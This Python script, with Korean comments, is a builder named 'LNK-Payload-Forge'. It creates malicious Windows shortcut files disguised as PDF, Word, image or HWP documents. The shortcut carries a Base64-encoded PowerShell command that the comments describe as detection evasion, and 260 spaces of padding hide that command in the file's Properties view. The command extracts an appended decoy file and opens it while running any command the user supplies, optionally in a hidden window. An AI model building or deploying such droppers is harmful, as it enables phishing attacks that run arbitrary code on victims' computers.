import os
import sys
import base64
import traceback
import pylnk3

# [1] 설정: 고유 Hex 구분자
HEX_MARKER = b'\xDE\xAD\xBE\xEF\xFE\xED\xFA\xCE\x11\x22\x33\x44\x55\x66\x77\x88'
HEX_MARKER_LIST = "0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED, 0xFA, 0xCE, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88"

def create_advanced_lnk():
    try:
        print("\n" + "="*60)
        print("   LNK-Payload-Forge v1.3 (Base64 & Stealth)")
        print("="*60)

        # 1. 파일 입력
        decoy_file = input("\n[1] 입력할 정상 파일명(확장자 포함): ").strip()
        if not os.path.exists(decoy_file):
            print(f"[!] 오류: '{decoy_file}' 파일이 없습니다.")
            return

        # 2. 명령어 입력
        default_cmd = 'echo [POC] System Vulnerability Confirmed. & pause'
        user_cmd = input(f"[2] 실행 명령어 (엔터 시 기본값):\n    > ").strip()
        final_cmd = user_cmd if user_cmd else default_cmd

        # 3. 은닉 선택
        print("\n[3] 명령어 실행창 은닉(Background)")
        print("    1 - 은닉 / 2 - 노출(디폴트)")
        hide_choice = input("    선택: ").strip()
        window_style = "Hidden" if hide_choice == "1" else "Normal"
        
        lnk_name = f"{decoy_file}.lnk"

        # [4] 핵심 로직: PowerShell 원본 스크립트 작성
        # LNK 자기 자신을 찾아 데이터를 추출하는 고유 로직
        raw_script = (
            f"$p = Join-Path $pwd '{lnk_name}'; "
            f"if(Test-Path $p){{ "
            f"  $b = [System.IO.File]::ReadAllBytes($p); "
            f"  [byte[]]$m = {HEX_MARKER_LIST}; "
            f"  $idx = -1; "
            f"  for($i=0; $i -le ($b.Length - $m.Length); $i++){{ "
            f"    $match=$true; for($j=0; $j -lt $m.Length; $j++){{ if($b[$i+$j] -ne $m[$j]){{ $match=$false; break }} }} "
            f"    if($match){{ $idx = $i + $m.Length; break }} "
            f"  }} "
            f"  if($idx -ne -1){{ "
            f"    $d = $b[$idx..($b.Length-1)]; "
            f"    $t = Join-Path $env:TEMP '{decoy_file}'; "
            f"    [System.IO.File]::WriteAllBytes($t, $d); "
            f"    Start-Process $t; {final_cmd} "
            f"  }} "
            f"}}"
        )

        # [5] 기법 1: 명령어 Base64 인코딩 (탐지 우회)
        # PowerShell의 -EncodedCommand는 UTF-16LE 기반 Base64를 사용해야 합니다.
        utf16_script = raw_script.encode('utf-16le')
        b64_script = base64.b64encode(utf16_script).decode()

        # [6] 기법 2: 길이 제한 기만 (공백 삽입)
        # 명령어 앞에 수많은 공백을 넣어 속성창의 '대상(Target)' 필드에서 실제 코드가 안 보이게 만듭니다.
        stealth_padding = " " * 260
        final_payload = f"/c powershell.exe -WindowStyle {window_style} -EncodedCommand {b64_script}"
        
        # 실제 LNK 대상 필드에 들어갈 전체 문자열
        target_arguments = stealth_padding + final_payload

        # 7. LNK 생성
        print(f"\n[+] '{lnk_name}' 빌드 및 Base64 인코딩 적용 중...")
        ext = os.path.splitext(decoy_file)[1].lower()
        icon_map = {'.pdf': 131, '.docx': 135, '.jpg': 302, '.png': 302, '.hwp': 16}
        idx = icon_map.get(ext, 1)

        pylnk3.create(
            filename=lnk_name,
            command="cmd.exe",
            arguments=target_arguments,
            icon="C:\\Windows\\System32\\shell32.dll",
            icon_index=idx
        )

        # 8. Binary Overlay
        with open(lnk_name, "ab") as f:
            f.write(HEX_MARKER)
            with open(decoy_file, "rb") as df:
                f.write(df.read())

        print(f"\n[✔] 생성 완료: {os.path.abspath(lnk_name)}")
        print(f"[*] 적용 기법: Base64 Encoding, Target Field Padding Bypass")

    except Exception as e:
        print(f"\n[!] 오류 발생:")
        traceback.print_exc()

if __name__ == "__main__":
    create_advanced_lnk()
